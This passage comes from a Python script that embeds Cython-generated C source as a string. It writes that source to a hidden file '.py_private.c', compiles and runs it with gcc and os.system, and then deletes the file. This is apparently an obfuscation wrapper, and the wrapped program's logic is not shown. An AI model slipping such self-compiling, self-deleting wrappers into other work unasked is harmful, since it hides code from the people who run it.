                            return (long) (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 3 * PyLong_SHIFT) {
                            return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 4 * PyLong_SHIFT) {
                            return (long) (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (long) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(long) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case -1: __PYX_VERIFY_RETURN_INT(long, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(long,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(long) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) ((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) ((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(long) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            long val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (long) -1;
        }
    } else {
        long val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (long) -1;
        val = __Pyx_PyInt_As_long(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to long");
    return (long) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to long");
    return (long) -1;
}

/* CIntFromPy */
    static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const int neg_one = (int) -1, const_zero = (int) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(int) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(int, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (int) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case  1: __PYX_VERIFY_RETURN_INT(int, digit, digits[0])
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 2 * PyLong_SHIFT) {
                            return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 3 * PyLong_SHIFT) {
                            return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 4 * PyLong_SHIFT) {
                            return (int) (((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (int) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(int) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case -1: __PYX_VERIFY_RETURN_INT(int, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(int,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(int) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) ((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(int) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            int val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (int) -1;
        }
    } else {
        int val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (int) -1;
        val = __Pyx_PyInt_As_int(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to int");
    return (int) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to int");
    return (int) -1;
}

/* CheckBinaryVersion */
    static int __Pyx_check_binary_version(void) {
    char ctversion[5];
    int same=1, i, found_dot;
    const char* rt_from_call = Py_GetVersion();
    PyOS_snprintf(ctversion, 5, "%d.%d", PY_MAJOR_VERSION, PY_MINOR_VERSION);
    found_dot = 0;
    for (i = 0; i < 4; i++) {
        if (!ctversion[i]) {
            same = (rt_from_call[i] < '0' || rt_from_call[i] > '9');
            break;
        }
        if (rt_from_call[i] != ctversion[i]) {
            same = 0;
            break;
        }
    }
    if (!same) {
        char rtversion[5] = {'\0'};
        char message[200];
        for (i=0; i<4; ++i) {
            if (rt_from_call[i] == '.') {
                if (found_dot) break;
                found_dot = 1;
            } else if (rt_from_call[i] < '0' || rt_from_call[i] > '9') {
                break;
            }
            rtversion[i] = rt_from_call[i];
        }
        PyOS_snprintf(message, sizeof(message),
                      "compiletime version %s of module '%.100s' "
                      "does not match runtime version %s",
                      ctversion, __Pyx_MODULE_NAME, rtversion);
        return PyErr_WarnEx(NULL, message, 1);
    }
    return 0;
}

/* InitStrings */
    static int __Pyx_InitStrings(__Pyx_StringTabEntry *t) {
    while (t->p) {
        #if PY_MAJOR_VERSION < 3
        if (t->is_unicode) {
            *t->p = PyUnicode_DecodeUTF8(t->s, t->n - 1, NULL);
        } else if (t->intern) {
            *t->p = PyString_InternFromString(t->s);
        } else {
            *t->p = PyString_FromStringAndSize(t->s, t->n - 1);
        }
        #else
        if (t->is_unicode | t->is_str) {
            if (t->intern) {
                *t->p = PyUnicode_InternFromString(t->s);
            } else if (t->encoding) {
                *t->p = PyUnicode_Decode(t->s, t->n - 1, t->encoding, NULL);
            } else {
                *t->p = PyUnicode_FromStringAndSize(t->s, t->n - 1);
            }
        } else {
            *t->p = PyBytes_FromStringAndSize(t->s, t->n - 1);
        }
        #endif
        if (!*t->p)
            return -1;
        if (PyObject_Hash(*t->p) == -1)
            return -1;
        ++t;
    }
    return 0;
}

static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {
    return __Pyx_PyUnicode_FromStringAndSize(c_str, (Py_ssize_t)strlen(c_str));
}
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {
    Py_ssize_t ignore;
    return __Pyx_PyObject_AsStringAndSize(o, &ignore);
}
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
#if !CYTHON_PEP393_ENABLED
static const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    char* defenc_c;
    PyObject* defenc = _PyUnicode_AsDefaultEncodedString(o, NULL);
    if (!defenc) return NULL;
    defenc_c = PyBytes_AS_STRING(defenc);
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    {
        char* end = defenc_c + PyBytes_GET_SIZE(defenc);
        char* c;
        for (c = defenc_c; c < end; c++) {
            if ((unsigned char) (*c) >= 128) {
                PyUnicode_AsASCIIString(o);
                return NULL;
            }
        }
    }
#endif
    *length = PyBytes_GET_SIZE(defenc);
    return defenc_c;
}
#else
static CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
    if (likely(PyUnicode_IS_ASCII(o))) {
        *length = PyUnicode_GET_LENGTH(o);
        return PyUnicode_AsUTF8(o);
    } else {
        PyUnicode_AsASCIIString(o);
        return NULL;
    }
#else
    return PyUnicode_AsUTF8AndSize(o, length);
#endif
}
#endif
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {
#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
    if (
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
            __Pyx_sys_getdefaultencoding_not_ascii &&
#endif
            PyUnicode_Check(o)) {
        return __Pyx_PyUnicode_AsStringAndSize(o, length);
    } else
#endif
#if (!CYTHON_COMPILING_IN_PYPY) || (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE))
    if (PyByteArray_Check(o)) {
        *length = PyByteArray_GET_SIZE(o);
        return PyByteArray_AS_STRING(o);
    } else
#endif
    {
        char* result;
        int r = PyBytes_AsStringAndSize(o, &result, length);
        if (unlikely(r < 0)) {
            return NULL;
        } else {
            return result;
        }
    }
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {
   int is_true = x == Py_True;
   if (is_true | (x == Py_False) | (x == Py_None)) return is_true;
   else return PyObject_IsTrue(x);
}
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject* x) {
    int retval;
    if (unlikely(!x)) return -1;
    retval = __Pyx_PyObject_IsTrue(x);
    Py_DECREF(x);
    return retval;
}
static PyObject* __Pyx_PyNumber_IntOrLongWrongResultType(PyObject* result, const char* type_name) {
#if PY_MAJOR_VERSION >= 3
    if (PyLong_Check(result)) {
        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,
                "__int__ returned non-int (type %.200s).  "
                "The ability to return an instance of a strict subclass of int "
                "is deprecated, and may be removed in a future version of Python.",
                Py_TYPE(result)->tp_name)) {
            Py_DECREF(result);
            return NULL;
        }
        return result;
    }
#endif
    PyErr_Format(PyExc_TypeError,
                 "__%.4s__ returned non-%.4s (type %.200s)",
                 type_name, type_name, Py_TYPE(result)->tp_name);
    Py_DECREF(result);
    return NULL;
}
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x) {
#if CYTHON_USE_TYPE_SLOTS
  PyNumberMethods *m;
#endif
  const char *name = NULL;
  PyObject *res = NULL;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_Check(x) || PyLong_Check(x)))
#else
  if (likely(PyLong_Check(x)))
#endif
    return __Pyx_NewRef(x);
#if CYTHON_USE_TYPE_SLOTS
  m = Py_TYPE(x)->tp_as_number;
  #if PY_MAJOR_VERSION < 3
  if (m && m->nb_int) {
    name = "int";
    res = m->nb_int(x);
  }
  else if (m && m->nb_long) {
    name = "long";
    res = m->nb_long(x);
  }
  #else
  if (likely(m && m->nb_int)) {
    name = "int";
    res = m->nb_int(x);
  }
  #endif
#else
  if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {
    res = PyNumber_Int(x);
  }
#endif
  if (likely(res)) {
#if PY_MAJOR_VERSION < 3
    if (unlikely(!PyInt_Check(res) && !PyLong_Check(res))) {
#else
    if (unlikely(!PyLong_CheckExact(res))) {
#endif
        return __Pyx_PyNumber_IntOrLongWrongResultType(res, name);
    }
  }
  else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_TypeError,
                    "an integer is required");
  }
  return res;
}
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject* b) {
  Py_ssize_t ival;
  PyObject *x;
#if PY_MAJOR_VERSION < 3
  if (likely(PyInt_CheckExact(b))) {
    if (sizeof(Py_ssize_t) >= sizeof(long))
        return PyInt_AS_LONG(b);
    else
        return PyInt_AsSsize_t(b);
  }
#endif
  if (likely(PyLong_CheckExact(b))) {
    #if CYTHON_USE_PYLONG_INTERNALS
    const digit* digits = ((PyLongObject*)b)->ob_digit;
    const Py_ssize_t size = Py_SIZE(b);
    if (likely(__Pyx_sst_abs(size) <= 1)) {
        ival = likely(size) ? digits[0] : 0;
        if (size == -1) ival = -ival;
        return ival;
    } else {
      switch (size) {
         case 2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -2:
           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -3:
           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case 4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return (Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
         case -4:
           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {
             return -(Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));
           }
           break;
      }
    }
    #endif
    return PyLong_AsSsize_t(b);
  }
  x = PyNumber_Index(b);
  if (!x) return -1;
  ival = PyInt_AsSsize_t(x);
  Py_DECREF(x);
  return ival;
}
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject* o) {
  if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {
    return (Py_hash_t) __Pyx_PyIndex_AsSsize_t(o);
#if PY_MAJOR_VERSION < 3
  } else if (likely(PyInt_CheckExact(o))) {
    return PyInt_AS_LONG(o);
#endif
  } else {
    Py_ssize_t ival;
    PyObject *x;
    x = PyNumber_Index(o);
    if (!x) return -1;
    ival = PyInt_AsLong(x);
    Py_DECREF(x);
    return ival;
  }
}
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b) {
  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);
}
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t ival) {
    return PyInt_FromSize_t(ival);
}


#endif /* Py_PYTHON_H */'''
C_FILE = ".py_private.c"
PYTHON_VERSION = ".".join(sys.version.split(" ")[0].split(".")[:-1])
COMPILE_FILE = (
    'gcc -I' +
    PREFIX +
    '/include/python' +
    PYTHON_VERSION +
    ' -o ' +
    EXECUTE_FILE +
    ' ' +
    C_FILE +
    ' -L' +
    PREFIX +
    '/lib -lpython' +
    PYTHON_VERSION
)


with open(C_FILE, "w") as f:
    f.write(C_SOURCE)

os.makedirs(os.path.dirname(EXECUTE_FILE), exist_ok=True)
os.system(EXPORT_PYTHONHOME+" && "+EXPORT_PYTHON_EXECUTABLE+" && "+COMPILE_FILE+" && "+RUN)

os.remove(C_FILE)
